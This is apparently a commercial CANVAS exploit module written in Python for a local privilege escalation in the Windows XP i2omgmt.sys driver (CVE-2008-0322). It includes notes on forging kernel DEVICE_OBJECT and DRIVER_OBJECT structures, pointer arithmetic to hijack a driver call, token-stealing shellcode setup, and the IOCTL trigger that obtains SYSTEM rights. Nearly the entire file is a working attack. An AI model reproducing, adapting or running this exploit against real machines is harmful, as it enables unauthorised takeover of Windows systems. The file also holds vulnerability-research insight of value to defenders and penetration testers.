
#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

#covers both angles
import sys
if "." not in sys.path:
    sys.path.append(".")

import socket
import time
import struct
import base64

from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localexploit import LocalExploit
from shelllistener import *
from MOSDEF import mosdef
import canvasengine

NAME="i2omgmt.sys I2OFltrParamsGetSet() Privilege Escalation"
DESCRIPTION="Driver Impersonation Attack Could Allow Local Privilege Escalation"


DOCUMENTATION={}
DOCUMENTATION["Repeatability"]="One Shot"
DOCUMENTATION["CVE Name"] = "CVE-2008-0322"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CCVE-2008-0322"
DOCUMENTATION['CVSS'] = 7.2
DOCUMENTATION["CVS URL"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=2008-0322"
DOCUMENTATION["Date public"] = "05/13/2008"

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP']

NOTES="""
Interesting bug, essentially the IOCTL handler assumes that a specific
IOCTL is being sent by another driver that is requesting that the i2omgmt.sys
driver make a function call into the next lower driver in the chain. The IOCTL 
InBuffer essentially is a pointer to a DEVICE_EXTENSION of which only the first two elements
are crucial:

DEVICE_EXTENSION
0x0 PDEVICE_OBJECT DeviceObject
0x4 PDEVICE_OBJECT LowerDeviceObject
...

So we forge a single DEVICE_OBJECT in memory and point both of those members to 
the fake DEVICE_OBJECT, so that we can control the final CALL [DRIVERMAINFUNC].

In the DEVICE_OBJECT we then set a pointer to a fake DRIVER_OBJECT. It is the 
DRIVER_OBJECT which contains our final call pointer, the relevant DEVICE_OBJECT
member. As well, we have to zero out enough space to set 0x30 to a positive stack
size, if we don't have a good stack size, a bugcheck is thrown just before the 
IopfCallDriver() call is made.

DEVICE_OBJECT
...
0x8  PDRIVER_OBJECT DriverObject
0x30 INT            StackSize

We now control the final DriverObject, we fill the struct with pointers to 
our shellcode to run. The relevant field is in the DriverObject is:

DRIVER_OBJECT
...
0x38 ULONG MajorFunction

With these pointers set in place, the i2omgmt.sys calls IofCallDriver() which
loads our fake DRIVER_OBJECT (because we set it to be the next device in the filter
chain in step one) and does a call [ DRIVER_OBJECT->MajorFunction ] and the
rest is history.


SETUP: 

- not all WinXP boxen have this driver loaded by default, however in the C:\WINDOWS\Driver Cache\i386\sp2.cab file 
decompress i2omgmt.sys into the system32/drivers directory, and reboot the machine

OFFSETS:

i2omgmt + 0xD6C => IOCTL handling dispatch routine
i2omgmt + 0x73C => Pointer math from us controlling EDI
"""

TODO="""
"""

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name                   = NAME
        self.result                 = 0
        self.device_name            = "\\\\.\\I2OExec"
        self.ioctl_code             = 0x222F80
        self.ioctl_buf_addr         = 0x0     
        self.ioctl_buf_len          = 0
        self.ioctl_buf              = ""

        # BBBB gets replaced by a pointer to our shellcode
        self.fake_driver_object     = "\x41\x41\x41\x41" * 28 + "BBBB"
        self.fake_driver_object_len = len( self.fake_driver_object )
        
        # AAAA is replaced by a pointer to our DRIVER_OBJECT
        # 0x11111111 is a positive stack size that works reliably to bypass the bugcheck
        self.fake_device_object     = "AAAABBBBAAAA" + ("\x00\x00\x00\x00" * 9 ) + "\x11\x11\x11\x11"
        self.fake_device_object_len = len(self.fake_device_object)
        
        self.shellcode_addr         = 0x0
        self.shellcode_len          = 0
        self.shellcode              = ""

    def memcpy(self, node, address, data):
        vars={}
        vars["address"] = address 
        vars["data"]    = data
        vars["size"]    = len(data)

        code="""
        //start of code
        #import "local","memcpy" as "memcpy"
        #import "int", "address" as "address"
        #import "int", "size" as "size"
        #import "string", "data" as "data"

        void main() 
        {
           memcpy(address, data, size);
        }
        """
        node.shell.clearfunctioncache()
        devlog("cparse", "MEMCPY Code: %s VARS: %s"%(code, vars))
        request=node.shell.compile(code,vars)
        node.shell.sendrequest(request)
        node.shell.leave()

    def BuildFakeDriver( self ):
        shellcode_header =  """movl %edi, %edi
        pushl %ebp
        movl %esp, %ebp
        pushl %ecx
        pushl %edx"""

        shellcode_header = mosdef.assemble( shellcode_header, "x86" )
                
        shellcode_footer = """popl %edx
        popl %ecx
        movl $0x00000001, %eax
        movl %ebp, %esp
        pop  %ebp
        """
        
        shellcode_footer = mosdef.assemble( shellcode_footer, "x86" )
        self.shellcode = shellcode_header + self.shellcode + shellcode_footer
        
        # Setup the shellcode
        self.shellcode_addr = self.node.shell.malloc( self.shellcode_len  )
        ret = self.memcpy(self.node, self.shellcode_addr, self.shellcode )
        self.log("Shellcode Address: 0x%08x" % self.shellcode_addr)

        # Setup the fake DRIVER_OBJECT
        fake_driver_address = self.node.shell.malloc( self.fake_driver_object_len )
        self.fake_driver_object = self.fake_driver_object.replace("BBBB", struct.pack("<L",self.shellcode_addr))
        ret = self.memcpy(self.node, fake_driver_address, self.fake_driver_object)
        self.log("Fake DRIVER_OBJECT address: 0x%08x" % fake_driver_address)
                
        # Ok so in order for us to work out the pointer math below
        # we will allocate a big chunk of memory, and figure out an
        # address that is divisable by 12, once we find one that 
        # will become the new how for our fake DEVICE_OBJECT
        brute = self.node.shell.malloc( 0x1000 )
        mod = -1
        while mod != 0:
            
            mod = ( brute - 8 ) % 12
            
            if mod != 0:
                brute = brute + 0x4
            else:
                brute_device_address = brute
                self.log("Found available address for DEVICE_OBJECT: 0x%08x" % brute_device_address)
                
        # Setup the fake DEVICE_OBJECT        
        fake_device_address = self.node.shell.malloc( self.fake_device_object_len )
        self.fake_device_object = self.fake_device_object.replace("AAAA", struct.pack("<L", fake_driver_address))
        ret = self.memcpy(self.node, fake_device_address, self.fake_device_object )
        self.log("Fake DEVICE_OBJECT address: 0x%08x" % fake_device_address)
        
        # Copy the pointer to the address we bruted
        pointer = struct.pack("<L", fake_device_address)
        self.memcpy(self.node, brute_device_address, pointer)
        
        # Now we setup what appears to be a DEVICE_OBJ_EXTENSION which 
        # has the first two members that are pointers to itself(DEVICE_OBJECT)
        # and to the DEVICE_OBJECT of the device in the filter chain below it
        # The code is as follows:
        # i2omgmt + 0x73c 
        # lea eax, [ edi + edi * 2 ]
        # mov eax, [ eax * 4 + 8 ]
        # We control edi and we need eax to point to our buffer
        # (thanks Kostya for the math!)
        device_object_ptr = ( brute_device_address - 8 ) / 12
        ioctl_buf = struct.pack("<L", device_object_ptr)
        ioctl_buf += ioctl_buf
        ioctl_buf += ioctl_buf
        self.ioctl_buf = ioctl_buf
        self.log("Value of EDI: 0x%08x" % device_object_ptr)
        
        self.ioctl_buf_len = len(ioctl_buf)
        self.ioctl_buf_addr = self.node.shell.malloc( self.ioctl_buf_len )
        ret = self.memcpy(self.node, self.ioctl_buf_addr, ioctl_buf )
        self.log("IOCTL Buffer Address: 0x%08x" % self.ioctl_buf_addr)
        
        return 1
                 
    def ExecuteIoctl( self ):
        
        # This just merely fires the IOCTL down to the device
        # with the InBuffer set to point to a pointer that 
        # is the beginning of our fake device chain
        GENERIC_READ = 0x80000000
        GENERIC_WRITE= 0x40000000
        OPEN_EXISTING= 0x00000003
            
        file_handle = self.node.shell.CreateFile(self.device_name,GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0)
        self.log("Driver file handle: %08x" % file_handle)
        
        output_buffer = self.node.shell.malloc( 5000 )
        nully = "\x00" * 5000
        self.memcpy(self.node, output_buffer, nully )
        
       
        
        vars={}
        vars['hDevice']      = file_handle
        vars['IoControlCode']= self.ioctl_code
        vars['ioctl_buf_addr'] = self.ioctl_buf_addr
        vars['ioctl_buf_len']  = len(self.ioctl_buf)
        vars['output_buffer']  = output_buffer
        
        code = """
        #import "remote","kernel32.dll|DeviceIoControl" as "DeviceIoControl"
        #import "local","sendint" as "sendint"
        #import "int","hDevice" as "hDevice"
        #import "int","IoControlCode" as "IoControlCode"
        #import "int","ioctl_buf_addr" as "ioctl_buf_addr"
        #import "int","ioctl_buf_len" as "ioctl_buf_len"
        #import "int","output_buffer" as "output_buffer"
        
        #import "local", "memcpy" as "memcpy"

        void main() {
          int ret;
          int cb;
          char inbuf[5000];
          char *pinbuf;
          pinbuf = inbuf;
          memcpy( pinbuf, ioctl_buf_addr, ioctl_buf_len );
          DeviceIoControl(hDevice,IoControlCode,pinbuf,5000,output_buffer,5000,&cb,0);
          
          sendint(1);
          return;
        }
        """
        
        self.node.shell.runCode( code, vars )
        self.log("Ran token stealing shellcode.")
        return
    
    def run_attack(self,node):
        self.node = node
        ret,nodeos=node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('Attacking Windows %d.%d'%(major,minor))
        if major < 5:
            self.log('This exploit is only for Windows XP, Windows Vista and Windows Server 2008.')
            return 0
        pid=node.shell.getpid() #the ProcessId we want to elevate to System
        
        #self.CreateRing0Shellcode(pid,8,major,minor)
        self.createRing0TokenShellcode(pid, 8, major,minor)
        
        self.log("About to build our fake driver....")

        # Now we build our fake driver and set its main function
        # to our shellcode...
        ret = self.BuildFakeDriver()
        
        if ret:            
            # Fire the IOCTL!
            self.ExecuteIoctl()
        else:
            self.log("Failed to allocate memory for fake DEVICE_OBJECT pointers.")
        
        # Now we test whether the exploit got us SYSTEM
        self.log("Fired the IOCTL to the I2OExec device, checking whether we succeeded.")
        whoami=self.exploitnodes("whoami",[node])[0]                                                                                                         
        self.log("Currently running as: %s"%whoami)
        if whoami[-1] == "$":
            self.log('Exploit succeeded!')
            self.setSucceeded()
            self.result = 1
            return 1
        self.log('Exploit seem to have failed.')
        
        return 0

    def run(self):
        self.setInfo('%s (in progress)'%(NAME))
        success=0 
        for node in self.argsDict['passednodes']:
            if 'win32api' not in node.capabilities:
                self.log('Node %s not a Win32 node'%(node.getname()))
                continue
            ret=self.run_attack(node)
            if ret==1:
                success=1
        return success

if __name__=='__main__':
    print 'This win32 local module is meant to be run only within CANVAS'
